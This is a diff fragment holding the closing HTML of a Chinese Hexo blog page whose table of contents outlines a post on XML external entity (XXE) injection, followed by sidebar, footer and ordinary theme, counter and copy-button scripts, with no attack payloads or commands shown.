+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、什么是xml"><span class="nav-number">1.</span> <span class="nav-text">一、什么是xml</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、关于Entity实体"><span class="nav-number">2.</span> <span class="nav-text">二、关于Entity实体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、外部实体（Xml-External-Entity）"><span class="nav-number">3.</span> <span class="nav-text">三、外部实体（Xml External Entity）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、外部实体注入-（XXE）"><span class="nav-number">4.</span> <span class="nav-text">四、外部实体注入 （XXE）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、加载外部DTD"><span class="nav-number">5.</span> <span class="nav-text">五、加载外部DTD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、当读取的内容中有xml语法标签时"><span class="nav-number">6.</span> <span class="nav-text">六、当读取的内容中有xml语法标签时</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">V3geD4g</p>
+  <div class="site-description" itemprop="description">一个小菜鸡的个人博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">V3geD4g</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+<br>
+<div class="powered-by">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <i class="fa fa-user-md"></i>
+    <span id="busuanzi_container_site_uv">
+        本站访客数:<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站访问量<span id="busuanzi_value_site_pv"></span>
+    </span>
+</div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #333;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #eee;
+      background-image: linear-gradient(#fcfcfc, #eee);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+  
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('post.copy_button').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('post.copy_success')
+          else $(this).text('post.copy_failure')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('post.copy_button')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
